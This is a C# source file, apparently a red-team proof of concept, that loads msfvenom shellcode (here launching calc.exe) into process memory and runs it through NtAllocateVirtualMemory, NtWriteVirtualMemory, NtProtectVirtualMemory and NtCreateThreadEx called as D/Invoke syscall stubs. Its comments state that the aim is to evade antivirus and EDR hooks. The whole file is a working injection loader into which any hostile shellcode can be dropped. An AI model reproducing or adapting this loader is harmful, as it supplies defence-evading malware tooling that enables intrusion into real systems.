using System;
using System.Runtime.InteropServices;

using DInvoke.DynamicInvoke;
using static Loader.Enums;
using static Loader.Structs;

namespace D_CRT
{
    class Program
    {
        /// <summary>
        /// This program will pop calc using the CreateRemoteThread style of process injection. 
        /// It uses the swaggy D/Invoke to call the unmanged code so we don't get hooked by AV/EDR API hooks.
        /// </summary>

        // SysCall Stubs
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate NtStatus NtOpenProcess(
            ref IntPtr ProcessHandle, 
            UInt32 AccessMask, 
            ref OBJECT_ATTRIBUTES ObjectAttributes, 
            ref CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate NtStatus NtAllocateVirtualMemory(
            IntPtr ProcessHandle, 
            ref IntPtr BaseAddress, 
            UInt32 ZeroBits, 
            ref UInt32 RegionSize,
            UInt32 AllocationType, 
            UInt32 Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate NtStatus NtWriteVirtualMemory(
            IntPtr ProcessHandle, 
            IntPtr BaseAddress, 
            byte[] Buffer, 
            UInt32 NumberOfBytesToWrite, 
            ref UInt32 NumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate NtStatus NtProtectVirtualMemory(
            IntPtr ProcessHandle, 
            ref IntPtr BaseAddress, 
            ref UInt32 NumberOfBytesToProtect, 
            UInt32 NewAccessProtection, 
            ref UInt32 OldAccessProtection);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate NtStatus NtCreateThreadEx(
            ref IntPtr threadHandle, 
            ACCESS_MASK desiredAccess, 
            IntPtr objectAttributes, 
            IntPtr processHandle, 
            IntPtr startAddress, 
            IntPtr parameter, 
            bool inCreateSuspended, 
            Int32 stackZeroBits, 
            Int32 sizeOfStack, 
            Int32 maximumStackSize, 
            IntPtr attributeList);

        static void Main(string[] args)
        { 
            // shellcode: msfvenom -p windows/x64/exec CMD="calc.exe" -f csharp
            byte[] buf = new byte[276] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
                0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
                0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
                0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
                0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
                0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
                0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
                0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
                0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
                0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
                0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
                0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
                0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
                0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
                0x63,0x2e,0x65,0x78,0x65,0x00 
            };

            // Classic Process Injection using D/Invoke and syscalls
            Console.WriteLine("[*] Beginning CreateRemoteThread Injection using D/Invoke (swaggy), hit enter to continue...");
            Console.ReadLine();         

            // Open a new process using NtOpenProcess
            Console.WriteLine("[+] Getting memory location of \"NtOpenProcess\" using D/Invoke...");
            IntPtr stub = Generic.GetSyscallStub("NtOpenProcess"); 
            Console.WriteLine("[>] NtOpenProcess memory location: " + string.Format("0x{0:X}", stub.ToInt64()));

            NtOpenProcess ntOpenProcess = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcess)); // our fancy-schmancy new function call
            IntPtr hProc = IntPtr.Zero; // handle to our process
            OBJECT_ATTRIBUTES oAttrributes = new OBJECT_ATTRIBUTES(); // attributes object to fill out (required by NtOpenProcess)
            CLIENT_ID cId = new CLIENT_ID // the process ID (and thread ID) to start the process with
            {
                UniqueProcess = Convert.ToInt32(System.Diagnostics.Process.GetCurrentProcess().Id) // get the current pid
            };

            Console.WriteLine("[+] Calling NtOpenProcess using D/Invoke...");
            NtStatus status = ntOpenProcess(ref hProc, (uint)ACCESS_MASK.GENERIC_ALL, ref oAttrributes, ref cId);
            Console.WriteLine("[>] Process handle: " + string.Format("{0}", hProc.ToInt64()));

            // allocate a region of memory using NtAllocateVirtualMemory
            Console.WriteLine("[+] Getting memory location of \"NtAllocateVirtualMemory\" using D/Invoke...");
            stub = Generic.GetSyscallStub("NtAllocateVirtualMemory");
            Console.WriteLine("[>] NtAllocateVirtualMemory memory location: " + string.Format("0x{0:X}", stub.ToInt64()));
            
            NtAllocateVirtualMemory ntAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));
            IntPtr hMemory = IntPtr.Zero; // handle to the region of memory to write the shellcode to
            UInt32 regionSize = (UInt32)buf.Length; // length of the shellcode

            Console.WriteLine("[+] Calling NtAllocateVirtualMemory using D/Invoke...");
            status = ntAllocateVirtualMemory(hProc, ref hMemory, 0, ref regionSize, (UInt32)(AllocationType.Commit | AllocationType.Reserve), (UInt32)MemoryProtection.ReadWrite);
            Console.WriteLine("[>] Memory handle: " + string.Format("0x{0:X}", hMemory.ToInt64()));

            // Write the shellcode to the memory
            Console.WriteLine("[+] Getting memory location of \"NtWriteVirtualMemory\" using D/Invoke...");
            stub = Generic.GetSyscallStub("NtWriteVirtualMemory");
            Console.WriteLine("[>] NtWriteVirtualMemory memory location: " + string.Format("0x{0:X}", stub.ToInt64()));

            NtWriteVirtualMemory ntWriteVirtualMemory = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemory));
            UInt32 bytesWritten = 0; // the amount of bytes written by ntWriteVirtualMemory

            Console.WriteLine("[+] Calling NtWriteVirtualMemory using D/Invoke...");
            status = ntWriteVirtualMemory(hProc, hMemory, buf, (UInt32)buf.Length, ref bytesWritten);
            Console.WriteLine("[>] Bytes Written: " + string.Format("{0}", bytesWritten));

            // Change the memory protections to RX
            Console.WriteLine("[+] Getting memory location of \"NtProtectVirtualMemory\" using D/Invoke...");
            stub = Generic.GetSyscallStub("NtProtectVirtualMemory");
            Console.WriteLine("[>] NtProtectVirtualMemory memory location: " + string.Format("0x{0:X}", stub.ToInt64()));

            NtProtectVirtualMemory ntProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));
            UInt32 oldProtect = 0; // the old protection value. If we wanted, we could cast this to a MemoryProtection to get the value

            Console.WriteLine("[+] Calling NtProtectVirtualMemory using D/Invoke...");
            status = ntProtectVirtualMemory(hProc, ref hMemory, ref regionSize, (UInt32)MemoryProtection.ExecuteRead, ref oldProtect);
            Console.WriteLine("[>] Changed to RX permissions at memory address: " + string.Format("0x{0:X}", hMemory.ToInt64()));

            // Create a thread to run the shellcode in memory
            Console.WriteLine("[+] Getting memory location of \"NtCreateThreadEx\" using D/Invoke...");
            stub = Generic.GetSyscallStub("NtCreateThreadEx");
            Console.WriteLine("[>] NtCreateThreadEx memory location: " + string.Format("0x{0:X}", stub.ToInt64()));

            NtCreateThreadEx ntCreateThreadEx = (NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateThreadEx));
            IntPtr hThread = IntPtr.Zero; // handle to the new thread


            Console.WriteLine("[+] Calling NtCreateThreadEx using D/Invoke...");
            status = ntCreateThreadEx(ref hThread, ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, hProc, hMemory, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            Console.WriteLine("[>] Created thread at memory location: " + string.Format("0x{0:X}", hMemory.ToInt64()));
            Console.ReadLine();
        }
    }
}
